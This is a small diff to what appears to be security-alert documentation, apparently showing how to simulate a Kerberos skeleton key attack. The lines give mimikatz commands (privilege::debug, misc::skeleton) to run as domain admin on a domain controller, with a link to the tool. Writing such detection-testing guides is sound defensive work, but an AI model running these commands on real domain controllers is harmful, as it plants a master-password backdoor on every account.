@@ -246,7 +246,7 @@ In this alert, the learned behavior of previous KRB_ERR message encryption from 
 
 From a command line on a workstation with a shell on DC, run as AD admin :
 
-*mimikatz # privilege::debug* 
+*mimikatz # privilege::debug*  
 *mimikatz # misc::skeleton*  => "mimikatz" should be the master password  
 
 Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
